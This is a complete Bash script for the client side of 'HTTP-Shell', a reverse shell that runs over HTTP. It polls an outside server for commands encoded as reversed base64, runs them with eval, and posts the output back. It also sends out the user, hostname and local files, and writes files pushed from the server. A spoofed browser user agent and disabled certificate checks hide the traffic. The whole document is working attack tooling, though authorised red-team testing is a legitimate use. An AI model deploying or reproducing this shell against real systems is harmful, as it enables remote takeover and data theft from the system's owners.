#!/bin/bash
#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

# Variables
server="$2"
sleeps="$4"
pwdnew="$(echo $PWD)"
cagent="Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"

# Help
if [[ $1 == *-h* ]] || [[ -z $2 ]]; then
   echo -e "\e[31m[!] Usage: ./HTTP-Client.sh -c [HOST:PORT] -s [SLEEP] (optional)\e[0m\n"
   exit 0
fi

# Functions
GetEnv() {
   usr="$(whoami | tr "[:upper:]" "[:lower:]")@$(hostname | tr "[:upper:]" "[:lower:]")"
   pwd="$pwdnew"
   echo "$usr!$pwd"
}

R64Encoder() {
   if [ "$1" = "-t" ]; then
      base64=$(echo -n "$2" | base64 -w 0 | tr "/+" "_-" | tr -d "=" | tr -d "[:space:]")
   elif [ "$1" = "-f" ]; then
      base64=$(base64 -w 0 "$2" | tr "+/" "-_" | sed "s/=*$//")
   fi
   revb64=$(echo "$base64" | rev)
   echo "$revb64"
}

R64Decoder() {
   if [ "$1" = "-t" ]; then
      base64=$(echo -n "$2" | rev | tr "-" "+" | tr "_" "/" )
      base64_len=$(( ${#base64} % 4 ))
      if [ "$base64_len" -eq 2 ]; then
         base64+="=="
      elif [ "$base64_len" -eq 3 ]; then
         base64+="="
      fi
   fi   
   revb64=$(echo "$base64" | base64 -d)
   echo "$revb64"
}

# Main
while true; do
  if [ "$sleeps" ]; then
    sleep "$sleeps"
  fi
  
  env=$(GetEnv) ; getenv64=$(R64Encoder -t "$env")
  request1=$(curl -A "$cagent" -s -k -X POST "$server/api/info" -d "Info: $getenv64")
  response=$(curl -A "$cagent" -s -k "$server/api/token")
  token=$(echo "$response" | grep -oP "Token: \K.*")
  invoke64=$(R64Decoder -t "$token") ; param="Debug"

  if [ -n "$invoke64" ]; then
      if [[ $invoke64 == "exit" ]]; then
         exit
      fi

      if [[ $invoke64 == upload* ]]; then
         file_path="${invoke64#upload }"
         file_path=$(echo $file_path | cut -d "!" -f 2)
         file_request=$(curl -A "$cagent" -s -k -X GET "$server/api/download")
         file_content=$(echo "$file_request" | grep -oP "File: \K.*")
         R64Decoder -t "$file_content" > "$file_path"
         continue
      fi

      if [[ $invoke64 == download* ]]; then
         file_path="${invoke64#download }"
         file_path=$(echo $file_path | cut -d "!" -f 1)
         file_content=$(R64Encoder -f "$file_path")
         download=$(curl -A "$cagent" -s -k -X POST "$server/api/upload" -d "File: $file_content")
         continue
      fi

      if [[ $invoke64 == cd* ]]; then
         new_dir="${invoke64#cd }"
         if [ "${new_dir:0:1}" != "/" ]; then
            new_dir="$pwdnew/$new_dir"
            new_dir=$(echo "$new_dir" | sed 's/["'\'']//g')
         fi
         if [ -d "$new_dir" ]; then
            cd "$new_dir"
            pwdnew=$(pwd)
            commandx="HTTPShellNull"
         else
            commandx="cd: $new_dir: No such file or directory"
            param="Error"
         fi

      else
         commandx=$(cd "$pwdnew" && eval "$invoke64" 2>&1)
         if [ $? -ne 0 ]; then
            param="Error"
         fi
      fi

      output64=$(R64Encoder -t "$commandx")
      path=$(echo "$param" | tr "[:upper:]" "[:lower:]")

      if [ "$param" == "Error" ]; then
         request2=$(curl -A "$cagent" -s -k -X POST "$server/api/error" -d "error: $output64")
      else
         request2=$(curl -A "$cagent" -s -k -X POST "$server/api/$path" -d "$param: $output64")
      fi
   fi
done
